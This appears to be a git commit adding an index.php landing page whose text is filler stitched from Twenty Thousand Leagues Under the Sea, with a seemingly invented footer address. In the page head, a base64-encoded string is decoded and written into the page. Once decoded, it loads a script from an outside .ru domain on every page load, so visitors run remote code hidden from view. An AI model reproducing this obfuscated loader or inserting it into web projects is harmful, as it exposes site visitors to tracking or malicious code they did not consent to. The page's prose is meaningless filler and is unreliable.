807d35a46dfd8045039fedfa52f4f2aa4a8ea18c
myuoglmv <77586983+myuoglmv@users.noreply.github.com>
2021-01-17 21:09:24 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Two miles further on we were stopped by the promontory which sh</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9nZDJpdXU0aHF6aDd3aTcyZHQiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="e73jhzxjp4f453s">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="#">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="u2pt6z4zj1mhqtnnb">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Two miles further on we were stopped by the promontory which sh</h1>
+	</section>
+
+
+	<section class="our-work" class="ewq16wi511grk10">
+		<h3 class="title">I do not know, I answered.</h3>
+		<p>In the port? said Ned ironically. Besides, Captain Farragut had spoken of a certain sum of two thousand dollars, set apart for whoever should first sight the monster, were he cabin-boy, common seaman, or officer. Come then. Conseil looked at it with scientific interest, and I am sure that he placed it, and not without reason, in the cartilaginous class, of the chondropterygian order, with fixed gills, of the selacian family, in the genus of the sharks.</p>
+		<hr>
+
+		<ul class="grid" class="ig5gupdu9gnkicwl">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="e73jhzxjp4f453s">
+		<h3 class="title">My friends, said I, the moment is come. On</h3>
+		<p>Ah! exclaimed Ned Land, if I was on board a whaler now, such a meeting would give me pleasure. It is one of large size. See with what strength its blow-holes throw up columns of air and steam! Confound it, why am I bound to these steel plates? Ned Land and Conseil waited there for me. I questioned them; they knew nothing. Lost in a heavy sleep in which they had been totally unconscious, they had been astonished at finding themselves in their cabin. Will they not come inside the Nautilus? I was on the platform when the altitude was taken, and the captain pronounced these words-It is here.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="u2pt6z4zj1mhqtnnb" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="ig5gupdu9gnkicwl" class="title">But vain excitement! The Abraham Lincoln checked its speed and </h3>	
+		<p>We know the transparency of the sea, and that its clearness is far beyond that of rock water. The mineral and organic substances which it holds in suspension heighten its transparency. In certain parts of the ocean at the Antilles, under seventy-five fathoms of water, can be seen with surprising clearness a bed of sand. The penetrating power of the solar rays does not seem to cease for a depth of one hundred and fifty fathoms. But in this middle fluid traveled over by the Nautilus the electric brightness was produced even in the bosom of the waves. It was no longer luminous water, but liquid light. How many men are there on board the Nautilus, do you think? Sir, I answered, without seeking to know who you are, I recognize in you an artist. There it collected numerous relics of the wreck-iron utensils, anchors, pulley-strops, swivel-guns, an eighteen-pound shot, fragments of astronomical instruments, a piece of crown-work, and a bronze clock, bearing this inscription: Bazin m'a fait, the mark of the foundry of the arsenal at Brest about 1785. There could be no further doubt.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="e73jhzxjp4f453s">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="u2pt6z4zj1mhqtnnb"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="ewq16wi511grk10"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="ig5gupdu9gnkicwl"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>84978 Jimmy Prairie, Suite 334, 11905-5929, Keelingchester, Utah, United States</p>
+	</footer>
+
+</body>
+
+</html>
